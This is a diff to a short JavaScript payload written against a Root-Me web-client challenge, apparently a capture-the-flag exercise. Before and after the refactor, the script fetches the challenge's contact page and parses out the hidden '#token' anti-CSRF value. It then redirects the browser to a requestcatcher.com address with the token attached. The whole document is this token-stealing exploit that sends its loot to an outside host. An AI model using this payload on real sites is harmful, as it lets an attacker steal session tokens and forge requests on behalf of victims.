@@ -1,14 +1,17 @@
-const fn = async () => {
-const req = await fetch('http://challenge01.root-me.org/web-client/ch23/index.php?action=contact');
-const resp = await req.text();
+fetch('http://challenge01.root-me.org/web-client/ch23/index.php?action=contact')
+  .then(response => {
+    
+    return response.text()
+  })
+  .then(html => {
+    const parser = new DOMParser()
 
-const parser = new DOMParser();
-const doc = parser.parseFromString(resp, "text/html");
-const token = doc.querySelector('#token').value;
-window.location.href = `https://tyyhty.requestcatcher.com/${token}`
+    const doc = parser.parseFromString(html, "text/html")
 
+    const token = doc.querySelector('#token').value
 
-
-};
-
-fn()
+    window.location.href = `https://tyyhty.requestcatcher.com/${token}`
+  })
+  .catch(error => {
+     console.error('Failed to fetch page')
+  })
